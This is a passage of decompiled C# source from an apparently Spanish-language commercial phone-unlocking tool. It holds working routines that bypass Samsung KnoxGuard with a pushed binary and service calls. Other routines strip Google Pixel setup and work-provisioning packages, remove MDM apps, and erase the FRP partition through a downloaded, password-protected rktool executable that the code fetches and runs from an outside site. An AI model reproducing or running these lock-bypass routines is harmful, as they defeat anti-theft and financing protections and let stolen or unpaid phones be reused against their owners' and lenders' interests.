					string zipPath = Path.Combine(storagePath, "rktool.7z");
					string rktoolExePath = Path.Combine(extractPath, "rktool.exe");
					string password = "dd20cd91-d35f-4958-884a-61a7e2f76281";
					this.txtOutput.AppendText("\ud83d\udd0d Verificando existencia de rktool..." + Environment.NewLine);
					bool flag2 = !File.Exists(rktoolExePath);
					if (flag2)
					{
						this.txtOutput.AppendText("\ud83d\udd04 rktool no encontrado. Preparando recursos..." + Environment.NewLine);
						bool flag3 = !File.Exists(zipPath);
						if (flag3)
						{
							bool exito = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/apk/rktool.7z", zipPath);
							if (!exito)
							{
								this.txtOutput.AppendText("❌ No se pudo descargar rktool.7z." + Environment.NewLine);
								return;
							}
						}
						if (Directory.Exists(extractPath))
						{
							Directory.Delete(extractPath, true);
						}
						Directory.CreateDirectory(extractPath);
						this.ExtractRomFileWith7Zip("rktool", password, extractPath);
					}
					string[] posiblesrktool = Directory.GetFiles(extractPath, "rktool.exe", SearchOption.AllDirectories);
					if (posiblesrktool.Length == 0)
					{
						MessageBox.Show("❌ rktool no se extrajo correctamente.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						rktoolExePath = posiblesrktool[0];
						Process.Start(rktoolExePath);
						string startHex = "0x00233000";
						string countHex = "0x00000400";
						Clipboard.SetText(string.Format("{0} {1}", startHex, countHex));
						string mensaje = string.Concat(new string[]
						{
							"En Advance Function:",
							Environment.NewLine,
							string.Format("Start: {0}", startHex),
							Environment.NewLine,
							string.Format("Count: {0}", countHex),
							Environment.NewLine,
							Environment.NewLine,
							"Los valores han sido copiados al portapapeles."
						});
						MessageBox.Show(mensaje, "Información Avanzada", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						this.txtOutput.AppendText("\ud83d\udce6 Go Advance Function and Copy:" + Environment.NewLine);
						this.txtOutput.AppendText(string.Format("Start: {0}", startHex) + Environment.NewLine);
						this.txtOutput.AppendText(string.Format("Count: {0}", countHex) + Environment.NewLine + Environment.NewLine);
						this.txtOutput.AppendText("Lee las particiones y verifica que FRP contenga los mismo valores" + Environment.NewLine + Environment.NewLine);
						this.txtOutput.AppendText("Erase LBA" + Environment.NewLine + Environment.NewLine);
						this.txtOutput.AppendText("✅ rktool iniciado." + Environment.NewLine);
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("❌ Error al iniciar rktool: " + ex.Message);
				}
			}
		}

		// Token: 0x06000122 RID: 290 RVA: 0x0000FF10 File Offset: 0x0000E110
		private void btndrivershonor_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			string fileName = "https://drive.google.com/file/d/1yykFZqikPj0JuJ76x6jKs5I3eQDdKAi-/view?usp=drive_link";
			try
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = fileName,
					UseShellExecute = true
				});
				this.txtOutput.AppendText("\ud83c\udf10 Abriendo enlace de descarga de driver Honor en el navegador..." + Environment.NewLine);
			}
			catch (Exception ex)
			{
				MessageBox.Show("❌ Error al abrir el enlace: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000123 RID: 291 RVA: 0x0000FFA4 File Offset: 0x0000E1A4
		private void AplicarResponsividad()
		{
			base.FormBorderStyle = FormBorderStyle.Sizable;
			base.MaximizeBox = true;
			bool flag = this.Tstool != null;
			if (flag)
			{
				this.Tstool.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left);
			}
			bool flag2 = this.txtOutput != null;
			if (flag2)
			{
				this.txtOutput.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
			}
			bool flag3 = this.ListView1 != null;
			if (flag3)
			{
				this.ListView1.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
			}
			bool flag4 = this.ProgressBar1 != null;
			if (flag4)
			{
				this.ProgressBar1.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
			}
			Control[] array = new Control[]
			{
				this.btnReadAdbAll,
				this.btnXploitZ,
				this.btnOpenAdbAdmin,
				this.btnCheckVirusOffline,
				this.btnCleanVirusOffline,
				this.btnRebootDevice,
				this.btnRebootRecovery,
				this.btnRebootDeviceBootloader,
				this.btnSolicitarLicenciaporWhats
			};
			foreach (Control control in array)
			{
				bool flag5 = control != null;
				if (flag5)
				{
					control.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
				}
			}
		}

		// Token: 0x06000124 RID: 292 RVA: 0x000100C4 File Offset: 0x0000E2C4
		private void ResponsividadTotal()
		{
			base.FormBorderStyle = FormBorderStyle.Sizable;
			base.MaximizeBox = true;
			this.AutoSize = false;
			bool flag = this.txtOutput != null;
			if (flag)
			{
				this.txtOutput.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
				int num = 20;
				this.txtOutput.Height = checked(base.ClientSize.Height - this.txtOutput.Location.Y - num);
			}
			bool flag2 = this.ProgressBar1 != null;
			if (flag2)
			{
				this.ProgressBar1.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
			}
			bool flag3 = this.Tstool != null;
			if (flag3)
			{
				this.Tstool.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left);
			}
			Control[] array = new Control[]
			{
				this.btnReadAdbAll,
				this.btnXploitZ,
				this.btnOpenAdbAdmin,
				this.btnCheckVirusOffline,
				this.btnCleanVirusOffline,
				this.btnRebootDevice,
				this.btnRebootRecovery,
				this.btnRebootDeviceBootloader,
				this.btnSolicitarLicenciaporWhats
			};
			foreach (Control control in array)
			{
				bool flag4 = control != null;
				if (flag4)
				{
					control.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
				}
			}
		}

		// Token: 0x06000125 RID: 293 RVA: 0x0001020C File Offset: 0x0000E40C
		private async void btnSolicitarFRPv1_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			string textoPlano = this.LimpiarTexto(this.txtOutput.Text);
			string uid = MySettingsProperty.Settings.FirebaseUid;
			string idToken = MySettingsProperty.Settings.FirebaseIdToken;
			string modelo = this.ExtraerValorDesdeTexto(textoPlano, "model:");
			string baseband = this.ExtraerValorDesdeTexto(textoPlano, "Baseband :");
			string serial = this.ExtraerValorDesdeTexto(textoPlano, "Serial Number :");
			string imei = this.ExtraerValorDesdeTexto(textoPlano, "IMEI:");
			bool flag = string.IsNullOrEmpty(modelo) || string.IsNullOrEmpty(baseband);
			if (flag)
			{
				MessageBox.Show("❌ No se pudo obtener modelo o baseband del dispositivo.");
			}
			else
			{
				string identificador = "";
				bool flag2 = !string.IsNullOrEmpty(imei);
				if (flag2)
				{
					identificador = imei;
				}
				else
				{
					bool flag3 = !string.IsNullOrEmpty(serial);
					if (!flag3)
					{
						MessageBox.Show("❌ No se encontró IMEI ni número de serie.");
						return;
					}
					identificador = serial;
				}
				int precioServicio = 20;
				try
				{
					string urlCreditos = string.Format("https://tstool-5ed2a-default-rtdb.firebaseio.com/usuarios/{0}/credits.json?auth={1}", uid, idToken);
					using (HttpClient client = new HttpClient())
					{
						string resp = await client.GetStringAsync(urlCreditos);
						int creditos;
						if (!int.TryParse(resp, out creditos))
						{
							MessageBox.Show("❌ No se pudo leer el número de créditos.");
						}
						else if (creditos < precioServicio)
						{
							MessageBox.Show("❌ No tienes créditos suficientes para este servicio.");
						}
						else
						{
							StringContent contenido = new StringContent((checked(creditos - precioServicio)).ToString(), Encoding.UTF8, "application/json");
							await client.PutAsync(urlCreditos, contenido);
							JObject ticket = new JObject
							{
								{
									"servicio",
									"FRP IMEI V1"
								},
								{
									"estado",
									"pendiente"
								},
								{
									"modelo",
									modelo
								},
								{
									"baseband",
									baseband
								},
								{
									"identificador",
									identificador
								},
								{
									"imei",
									imei
								},
								{
									"serial",
									serial
								},
								{
									"fecha",
									DateTime.UtcNow.ToString("s")
								}
							};
							string urlTickets = string.Format("https://tstool-5ed2a-default-rtdb.firebaseio.com/usuarios/{0}/tickets.json?auth={1}", uid, idToken);
							StringContent contentTicket = new StringContent(ticket.ToString(), Encoding.UTF8, "application/json");
							await client.PostAsync(urlTickets, contentTicket);
							MessageBox.Show(string.Format("✅ Servicio solicitado correctamente. Se descontaron {0} créditos.", precioServicio));
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("❌ Error al procesar el servicio: " + ex.Message);
				}
			}
		}

		// Token: 0x06000126 RID: 294 RVA: 0x00010254 File Offset: 0x0000E454
		private async Task EjecutarKnoxGuardExploit(string selectedDevice)
		{
			checked
			{
				try
				{
					this.txtOutput.AppendText("⏳ Iniciando exploit KG Active 01..." + Environment.NewLine);
					using (Process pushProc = Process.Start(new ProcessStartInfo("adb", string.Format("-s {0} push sm /data/local/tmp/", selectedDevice))
					{
						UseShellExecute = false,
						RedirectStandardOutput = true,
						RedirectStandardError = true,
						CreateNoWindow = true
					}))
					{
						string output = await pushProc.StandardOutput.ReadToEndAsync();
						string errorOutput = await pushProc.StandardError.ReadToEndAsync();
						pushProc.WaitForExit();
						this.txtOutput.AppendText("\ud83d\udce6 Auth bin: " + Environment.NewLine);
						if (!string.IsNullOrWhiteSpace(errorOutput))
						{
							this.txtOutput.AppendText("⚠️ Error en push: " + errorOutput + Environment.NewLine);
						}
					}
					ProcessStartInfo psi = new ProcessStartInfo("adb", string.Format("-s {0} shell", selectedDevice))
					{
						UseShellExecute = false,
						RedirectStandardInput = true,
						RedirectStandardOutput = true,
						RedirectStandardError = true,
						CreateNoWindow = true
					};
					using (Process adbShell = Process.Start(psi))
					{
						StreamWriter writer = adbShell.StandardInput;
						StreamReader reader = adbShell.StandardOutput;
						writer.WriteLine("chmod +x /data/local/tmp/sm");
						writer.WriteLine("/data/local/tmp/sm");
						writer.Flush();
						await Task.Delay(1000);
						string[] comandos = new string[]
						{
							"service call knoxguard_service 37",
							"service call knoxguard_service 41 s16 \"null\"",
							"service call knoxguard_service 36",
							"quit"
						};
						int contador = 1;
						foreach (string cmd in comandos)
						{
							this.txtOutput.AppendText(string.Format("→ Enviando: Xploit {0} {1}", contador, Environment.NewLine));
							writer.WriteLine(cmd);
							writer.Flush();
							await Task.Delay(1000);
							contador++;
						}
						Stopwatch sw = new Stopwatch();
						sw.Start();
						sw.Stop();
						if (sw.Elapsed.TotalSeconds >= 10.0)
						{
						}
					}
				}
				catch (Exception ex)
				{
					this.txtOutput.AppendText("❌ Error durante el exploit: " + ex.Message + Environment.NewLine);
				}
			}
		}

		// Token: 0x06000127 RID: 295 RVA: 0x000102A0 File Offset: 0x0000E4A0
		private async Task EjecutarUnlockPixelAsync(string selectedDevice, RichTextBox richTextBoxLog)
		{
			bool flag = this.processRunning;
			checked
			{
				if (flag)
				{
					MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
				}
				else
				{
					this.processRunning = true;
					this.cancelRequested = false;
					this.SetAllButtonsEnabled(false, null);
					this.btnCancelarProceso.Enabled = true;
					this.VerificarEntornoSeguro();
					this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.InitializeProgressBar(2);
						this.UpdateProgressBar();
					}));
					List<string> comandos = new List<string>
					{
						"shell input keyevent KEYCODE_WAKEUP",
						"shell input keyevent 82",
						"shell am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:com.google.android.apps.work.oobconfig",
						"shell pm list packages -U | grep com.google.android.apps.work.oobconfig",
						"shell appops set com.google.android.apps.work.oobconfig WAKE_LOCK ignore",
						"shell device_config put oslo mcc_whitelist ua",
						"shell device_config set_sync_disabled_for_tests persistent",
						"shell device_config set_sync_disabled_for_tests none",
						"shell pm disable-user --user 0 com.google.android.factoryota",
						"shell pm clear --user 0 com.google.android.vending",
						"shell appops get com.google.android.apps.work.oobconfig WAKE_LOCK",
						"shell appops get com.google.android.apps.work.oobconfig RUN_IN_BACKGROUND",
						"shell appops get com.google.android.apps.work.oobconfig RUN_ANY_IN_BACKGROUND",
						"shell appops get com.google.android.apps.work.oobconfig START_FOREGROUND",
						"shell appops get com.google.android.apps.work.oobconfig ACCESS_RESTRICTED_SETTINGS",
						"shell appops set com.google.android.apps.work.oobconfig RUN_IN_BACKGROUND deny",
						"shell appops set com.google.android.apps.work.oobconfig RUN_ANY_IN_BACKGROUND deny",
						"shell appops set com.google.android.apps.work.oobconfig START_FOREGROUND deny",
						"shell appops set com.google.android.apps.work.oobconfig ACCESS_RESTRICTED_SETTINGS deny",
						"shell pm disable --user 0 com.google.android.apps.work.oobconfig",
						"shell pm disable-user --user 0 com.google.android.apps.work.oobconfig",
						"shell pm clear --user 0 com.android.carriersetup",
						"shell pm uninstall -k --user 0 com.android.carriersetup",
						"shell pm clear --user 0 com.google.android.pixel.setupwizard",
						"shell pm uninstall -k --user 0 com.google.android.pixel.setupwizard",
						"shell pm clear --user 0 com.google.android.pixel.setupwizard.overlay",
						"shell pm uninstall -k --user 0 com.google.android.pixel.setupwizard.overlay",
						"shell pm clear --user 0 com.google.android.pixel.setupwizard.overlay2019",
						"shell pm uninstall -k --user 0 com.google.android.pixel.setupwizard.overlay2019",
						"shell pm clear --user 0 com.google.android.pixel.setupwizard.autogenerated_rro_product__",
						"shell appops set com.google.android.apps.tachyon RUN_IN_BACKGROUND allow",
						"shell appops set com.google.android.apps.tachyon RUN_ANY_IN_BACKGROUND allow",
						"shell appops set com.google.android.apps.tachyon READ_PHONE_STATE allow",
						"shell cmd netpolicy set restrict-background true com.google.android.apps.work.oobconfig",
						"shell cmd netpolicy set restrict-background true com.google.android.apps.work.oobconfig",
						"shell appops set com.google.android.apps.tachyon WRITE_SETTINGS allow"
					};
					try
					{
						int num = comandos.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							int patchNum = i + 1;
							richTextBoxLog.AppendText(string.Format("- Unlock Data Patch  {0}...OK", patchNum) + Environment.NewLine);
							string output = this.ExecuteAdbCommand(comandos[i], selectedDevice);
							await Task.Delay(400);
						}
						richTextBoxLog.AppendText("-" + Environment.NewLine);
						richTextBoxLog.AppendText("✅ Unlock Google Pixel listo!" + Environment.NewLine);
					}
					catch (Exception ex)
					{
						richTextBoxLog.AppendText("❌ Error en el proceso: " + ex.Message + Environment.NewLine);
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x06000128 RID: 296 RVA: 0x000102F4 File Offset: 0x0000E4F4
		private async Task EjecutarUnlockPixelRelockAsync(string selectedDevice, RichTextBox richTextBoxLog)
		{
			this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
			{
				this.InitializeProgressBar(2);
				this.UpdateProgressBar();
			}));
			List<string> comandos = new List<string>
			{
				"shell input keyevent KEYCODE_WAKEUP",
				"shell input keyevent 82",
				"shell am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:com.google.android.apps.work.oobconfig",
				"shell pm list packages -U | grep com.google.android.apps.work.oobconfig",
				"shell device_config put oslo mcc_whitelist ua",
				"shell device_config set_sync_disabled_for_tests persistent",
				"shell device_config set_sync_disabled_for_tests none",
				"shell appops set com.google.android.apps.work.oobconfig WAKE_LOCK ignore",
				"shell appops get com.google.android.apps.work.oobconfig WAKE_LOCK",
				"shell appops get com.google.android.apps.work.oobconfig RUN_IN_BACKGROUND",
				"shell appops get com.google.android.apps.work.oobconfig RUN_ANY_IN_BACKGROUND",
				"shell appops get com.google.android.apps.work.oobconfig START_FOREGROUND",
				"shell appops get com.google.android.apps.work.oobconfig ACCESS_RESTRICTED_SETTINGS",
				"shell appops set com.google.android.apps.work.oobconfig RUN_IN_BACKGROUND deny",
				"shell appops set com.google.android.apps.work.oobconfig RUN_ANY_IN_BACKGROUND deny",
				"shell appops set com.google.android.apps.work.oobconfig START_FOREGROUND deny",
				"shell appops set com.google.android.apps.work.oobconfig ACCESS_RESTRICTED_SETTINGS deny",
				"shell appops set com.google.android.apps.tachyon RUN_IN_BACKGROUND allow",
				"shell appops set com.google.android.apps.tachyon RUN_ANY_IN_BACKGROUND allow",
				"shell appops set com.google.android.apps.tachyon READ_PHONE_STATE allow",
				"shell appops set com.google.android.apps.tachyon WRITE_SETTINGS allow",
				"shell cmd netpolicy set restrict-background true com.google.android.apps.work.oobconfig",
				"shell cmd netpolicy set restrict-background true com.google.android.apps.work.oobconfig"
			};
			checked
			{
				try
				{
					int num = comandos.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						int patchNum = i + 1;
						richTextBoxLog.AppendText(string.Format("- Unlock Data Patch  {0}...OK", patchNum) + Environment.NewLine);
						string output = this.ExecuteAdbCommand(comandos[i], selectedDevice);
						await Task.Delay(400);
					}
					richTextBoxLog.AppendText("-" + Environment.NewLine);
					richTextBoxLog.AppendText("✅ Unlock Google Pixel listo!" + Environment.NewLine);
				}
				catch (Exception ex)
				{
					richTextBoxLog.AppendText("❌ Error en el proceso: " + ex.Message + Environment.NewLine);
				}
			}
		}

		// Token: 0x06000129 RID: 297 RVA: 0x00010346 File Offset: 0x0000E546
		private void FinalizarProcesoUI()
		{
			this.processRunning = false;
			this.btnCancelarProceso.Enabled = false;
			this.AplicarPermisosDesdeFirebasePorPlan();
		}

		// Token: 0x0600012A RID: 298 RVA: 0x00010364 File Offset: 0x0000E564
		private async void LeerInfoSideload()
		{
			this.txtOutput.AppendText("[SIDELOAD] READ INFO Starting ADB Interface..." + Environment.NewLine);
			string adbPath = "adb";
			string output = await this.EjecutarComandoAdbAsync(string.Format("{0} devices", adbPath));
			if (!output.Contains("sideload"))
			{
				this.txtOutput.AppendText("❌ No se detectó dispositivo en modo sideload." + Environment.NewLine);
			}
			else
			{
				this.txtOutput.AppendText("Connecting to device... OK" + Environment.NewLine);
				this.txtOutput.AppendText("Connection Mode : sideload" + Environment.NewLine);
				Dictionary<string, string> props = await this.LeerPropiedadesAsync();
				this.txtOutput.AppendText(string.Format("Product Model : {0}{1}", this.GetValorSeguro(props, "ro.product.model", "N/A"), Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Product Name : {0}{1}", this.GetValorSeguro(props, "ro.product.name", "N/A"), Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Device Name : {0}{1}", this.GetValorSeguro(props, "ro.product.device", "N/A"), Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Device Name : {0}{1}", this.GetValorSeguro(props, "ro.build.product", "N/A"), Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Firmware Version : {0}{1}", this.GetValorSeguro(props, "ro.build.version.incremental", "N/A"), Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Android Version : {0}{1}", this.GetValorSeguro(props, "ro.build.version.release", "N/A"), Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Language : {0}{1}", this.GetValorSeguro(props, "persist.sys.locale", "N/A"), Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Region : {0}{1}", this.GetValorSeguro(props, "ro.product.locale.region", "N/A"), Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Recovery Version : {0}{1}", this.GetValorSeguro(props, "ro.boot.recovery", "2"), Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Device Serial : {0}{1}", this.GetValorSeguro(props, "ro.boot.serialno", "N/A"), Environment.NewLine));
				this.txtOutput.AppendText("ROM Zone : 2" + Environment.NewLine);
			}
		}

		// Token: 0x0600012B RID: 299 RVA: 0x000103A0 File Offset: 0x0000E5A0
		private async Task<Dictionary<string, string>> LeerPropiedadesAsync()
		{
			Dictionary<string, string> resultado = new Dictionary<string, string>();
			string salida = await this.EjecutarComandoAdbAsync("adb shell getprop");
			foreach (string linea in salida.Split(new string[]
			{
				Environment.NewLine
			}, StringSplitOptions.RemoveEmptyEntries))
			{
				if (linea.StartsWith("["))
				{
					string[] partes = linea.Split(new string[]
					{
						"] ["
					}, StringSplitOptions.None);
					if (partes.Length == 2)
					{
						string clave = partes[0].Replace("[", "").Trim();
						string valor = partes[1].Replace("]", "").Trim();
						if (!resultado.ContainsKey(clave))
						{
							resultado.Add(clave, valor);
						}
					}
				}
			}
			return resultado;
		}

		// Token: 0x0600012C RID: 300 RVA: 0x000103E4 File Offset: 0x0000E5E4
		private async Task<string> EjecutarComandoAdbAsync(string comando)
		{
			return await Task.Run<string>(delegate()
			{
				ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c " + comando)
				{
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				string result;
				using (Process process = Process.Start(startInfo))
				{
					string text = process.StandardOutput.ReadToEnd();
					process.WaitForExit();
					result = text;
				}
				return result;
			});
		}

		// Token: 0x0600012D RID: 301 RVA: 0x00010430 File Offset: 0x0000E630
		private string GetValorSeguro(Dictionary<string, string> dic, string clave, string valorPorDefecto = "N/A")
		{
			bool flag = dic.ContainsKey(clave);
			string result;
			if (flag)
			{
				result = dic[clave];
			}
			else
			{
				result = valorPorDefecto;
			}
			return result;
		}

		// Token: 0x0600012E RID: 302 RVA: 0x00010459 File Offset: 0x0000E659
		private void AplicarEstilosGlobales()
		{
			this.BackColor = Color.FromArgb(240, 248, 255);
			this.ForeColor = Color.Black;
			this.AplicarEstiloControles(this);
		}

		// Token: 0x0600012F RID: 303 RVA: 0x0001048C File Offset: 0x0000E68C
		private void AplicarEstiloControles(Control ctrl)
		{
			try
			{
				foreach (object obj in ctrl.Controls)
				{
					Control control = (Control)obj;
					bool flag = control is Button;
					if (flag)
					{
						this.AplicarEstiloBotonPorNombre((Button)control);
					}
					else
					{
						bool flag2 = control is TabControl;
						if (flag2)
						{
							control.BackColor = Color.White;
						}
						else
						{
							bool flag3 = control is TabPage || control is GroupBox;
							if (flag3)
							{
								control.BackColor = Color.White;
								control.ForeColor = Color.Black;
							}
							else
							{
								bool flag4 = control is RichTextBox;
								if (flag4)
								{
									RichTextBox richTextBox = (RichTextBox)control;
									richTextBox.BackColor = Color.White;
									richTextBox.ForeColor = Color.Black;
								}
								else
								{
									control.BackColor = Color.White;
									control.ForeColor = Color.Black;
								}
							}
						}
					}
					bool hasChildren = control.HasChildren;
					if (hasChildren)
					{
						this.AplicarEstiloControles(control);
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000130 RID: 304 RVA: 0x000105D8 File Offset: 0x0000E7D8
		private void AplicarEstiloBotonPorNombre(Button btn)
		{
			btn.FlatStyle = FlatStyle.Flat;
			btn.FlatAppearance.BorderSize = 0;
			btn.Font = new Font("Segoe UI", 9f, FontStyle.Bold);
			btn.Height = 36;
			btn.Width = 180;
			btn.Margin = new Padding(6);
			btn.TextAlign = ContentAlignment.MiddleCenter;
			btn.AutoSize = false;
			string text = btn.Name.ToLower();
			bool flag = text.Contains("samsung") | text.Contains("knox");
			if (flag)
			{
				btn.BackColor = Color.FromArgb(0, 120, 215);
				btn.ForeColor = Color.White;
			}
			else
			{
				bool flag2 = text.Contains("motorola");
				if (flag2)
				{
					btn.BackColor = Color.FromArgb(0, 153, 0);
					btn.ForeColor = Color.White;
				}
				else
				{
					bool flag3 = text.Contains("huawei") | text.Contains("honor");
					if (flag3)
					{
						btn.BackColor = Color.FromArgb(204, 0, 102);
						btn.ForeColor = Color.White;
					}
					else
					{
						bool flag4 = text.Contains("oppo") | text.Contains("mdm");
						if (flag4)
						{
							btn.BackColor = Color.FromArgb(255, 140, 0);
							btn.ForeColor = Color.White;
						}
						else
						{
							bool flag5 = text.Contains("frp") | text.Contains("virus");
							if (flag5)
							{
								btn.BackColor = Color.FromArgb(255, 51, 51);
								btn.ForeColor = Color.White;
							}
							else
							{
								bool flag6 = text.Contains("bypass") | text.Contains("xploit");
								if (flag6)
								{
									btn.BackColor = Color.MediumPurple;
									btn.ForeColor = Color.White;
								}
								else
								{
									bool flag7 = text.Contains("pay");
									if (flag7)
									{
										btn.BackColor = Color.FromArgb(211, 255, 74);
										btn.ForeColor = Color.Black;
									}
									else
									{
										bool flag8 = text.Contains("telcel");
										if (flag8)
										{
											btn.BackColor = Color.FromArgb(0, 79, 149);
											btn.ForeColor = Color.White;
										}
										else
										{
											bool flag9 = text.Contains("reboot");
											if (flag9)
											{
												btn.BackColor = Color.FromArgb(100, 100, 100);
												btn.ForeColor = Color.White;
											}
											else
											{
												btn.BackColor = Color.LightGray;
												btn.ForeColor = Color.Black;
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}

		// Token: 0x06000131 RID: 305 RVA: 0x00010888 File Offset: 0x0000EA88
		public void EjecutarProcesoAdb(string nombreProceso, List<List<string>> etapas, string selectedDevice)
		{
			Form1._Closure$__268-0 CS$<>8__locals1 = new Form1._Closure$__268-0(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			CS$<>8__locals1.$VB$Local_nombreProceso = nombreProceso;
			CS$<>8__locals1.$VB$Local_etapas = etapas;
			CS$<>8__locals1.$VB$Local_selectedDevice = selectedDevice;
			Task.Run(checked(delegate()
			{
				CS$<>8__locals1.$VB$Me.ProgressBar1.Invoke((CS$<>8__locals1.$I1 == null) ? (CS$<>8__locals1.$I1 = delegate()
				{
					CS$<>8__locals1.$VB$Me.InitializeProgressBar(CS$<>8__locals1.$VB$Local_etapas.Count);
				}) : CS$<>8__locals1.$I1);
				CS$<>8__locals1.$VB$Me.txtOutput.Invoke((CS$<>8__locals1.$I2 == null) ? (CS$<>8__locals1.$I2 = delegate()
				{
					CS$<>8__locals1.$VB$Me.txtOutput.AppendText(Environment.NewLine + string.Format("Iniciando proceso {0}...", CS$<>8__locals1.$VB$Local_nombreProceso) + Environment.NewLine);
				}) : CS$<>8__locals1.$I2);
				Form1._Closure$__268-1 CS$<>8__locals2 = new Form1._Closure$__268-1(CS$<>8__locals2);
				CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1;
				Form1._Closure$__268-1 CS$<>8__locals3 = CS$<>8__locals2;
				int num = CS$<>8__locals1.$VB$Local_etapas.Count - 1;
				CS$<>8__locals3.$VB$Local_i = 0;
				while (CS$<>8__locals2.$VB$Local_i <= num)
				{
					List<string> list = CS$<>8__locals1.$VB$Local_etapas[CS$<>8__locals2.$VB$Local_i];
					try
					{
						foreach (string command in list)
						{
							CS$<>8__locals1.$VB$Me.ExecuteAdbCommand(command, CS$<>8__locals1.$VB$Local_selectedDevice);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					CS$<>8__locals1.$VB$Me.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						CS$<>8__locals1.$VB$Me.UpdateProgressBar();
					}));
					CS$<>8__locals1.$VB$Me.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.txtOutput.AppendText(string.Format("Proceso {0} completado.", CS$<>8__locals2.$VB$Local_i + 1) + Environment.NewLine);
					}));
					bool flag = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem != null;
					if (flag)
					{
						string text = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
					}
					CS$<>8__locals2.$VB$Local_i++;
				}
				CS$<>8__locals1.$VB$Me.processRunning = false;
				CS$<>8__locals1.$VB$Me.btnCancelarProceso.Enabled = false;
				CS$<>8__locals1.$VB$Me.AplicarPermisosDesdeFirebasePorPlan();
				CS$<>8__locals1.$VB$Me.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Me.txtOutput.AppendText("Done..." + Environment.NewLine);
				}));
			}));
		}

		// Token: 0x06000132 RID: 306 RVA: 0x000108CC File Offset: 0x0000EACC
		private async void btnCleanMDMApps_Click(object sender, EventArgs e)
		{
			try
			{
				Form1._Closure$__269-0 CS$<>8__locals1 = new Form1._Closure$__269-0(CS$<>8__locals1);
				CS$<>8__locals1.$VB$Me = this;
				List<string> devices = await Task.Run<List<string>>(() => this.GetAdbDevices());
				if (devices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else if (this.processRunning)
				{
					MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
				}
				else
				{
					this.processRunning = true;
					this.cancelRequested = false;
					this.SetAllButtonsEnabled(false, null);
					this.btnCancelarProceso.Enabled = true;
					this.VerificarEntornoSeguro();
					this.ListView1.Visible = false;
					this.txtOutput.Clear();
					this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.InitializeProgressBar(2);
						this.UpdateProgressBar();
					}));
					this.txtOutput.AppendText(string.Format("Process: {0}{1}", "MDM All Patch 2025 Adb", Environment.NewLine));
					CS$<>8__locals1.$VB$Local_selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					this.LeerInformacionAdbPorMarca(CS$<>8__locals1.$VB$Local_selectedDevice);
					Dictionary<string, string> paquetesDict = await Task.Run<Dictionary<string, string>>(() => this.ObtenerDiccionarioBloqueos());
					this.UpdateProgressBar();
					this.MostrarEstadoAntesDelProceso(":", paquetesDict, CS$<>8__locals1.$VB$Local_selectedDevice);
					List<string> etapaClear = new List<string>();
					List<string> etapaDisable = new List<string>();
					List<string> etapaUninstall = new List<string>();
					try
					{
						foreach (string pkg in paquetesDict.Values.Distinct<string>())
						{
							etapaClear.Add(string.Format("shell pm clear --user 0 {0}", pkg));
